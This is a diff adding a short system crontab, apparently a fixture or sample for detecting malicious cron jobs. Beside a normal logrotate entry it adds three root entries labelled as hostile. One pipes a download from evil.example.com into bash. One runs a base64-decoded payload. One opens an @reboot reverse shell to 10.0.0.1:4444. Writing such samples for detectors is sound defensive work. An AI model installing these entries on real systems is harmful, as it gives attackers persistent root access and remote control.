@@ -1,0 +1,11 @@
+# System crontab
+SHELL=/bin/bash
+
+# Normal log rotation
+0 3 * * * root /usr/sbin/logrotate /etc/logrotate.conf
+# Backdoor entry
+*/5 * * * * root curl -s http://evil.example.com/payload | bash
+# Encoded payload
+0 * * * * root echo dGVzdAo= | base64 -d | sh
+# Reverse shell
+@reboot root bash -i >& /dev/tcp/10.0.0.1/4444 0>&1
